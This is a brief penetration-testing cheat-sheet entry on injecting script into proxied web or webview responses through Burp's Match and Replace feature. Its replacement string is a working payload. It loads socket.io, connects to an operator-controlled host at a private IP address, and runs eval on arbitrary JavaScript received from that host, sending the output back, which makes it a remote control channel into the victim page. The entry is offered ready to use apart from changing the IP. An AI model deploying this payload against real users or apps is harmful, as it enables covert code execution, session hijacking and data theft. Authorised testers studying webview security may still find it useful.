# Injecting to webview or other pages from Burp Proxy

[ Proxy > Options > Match and Replace ]

`Type`: `Response Body`

`Match` : `</title>`

`Replace` :
```
</title><script src="https://cdn.socket.io/4.4.1/socket.io.min.js"></script> <script>  var socket = io.connect('https://10.11.3.2:8089');     try{setTimeout(`socket.emit('sendMSG','Connection Established.')`,1000)}     catch{}     socket.on('getMSG',function(data){         try{              output=eval(data)+""         }         catch(e){             output=e+""         }         socket.emit('sendMSG',output)     }) </script>
```

Note - Change the IP address. If target page does not has </title> tag in response then modify it accordingly.
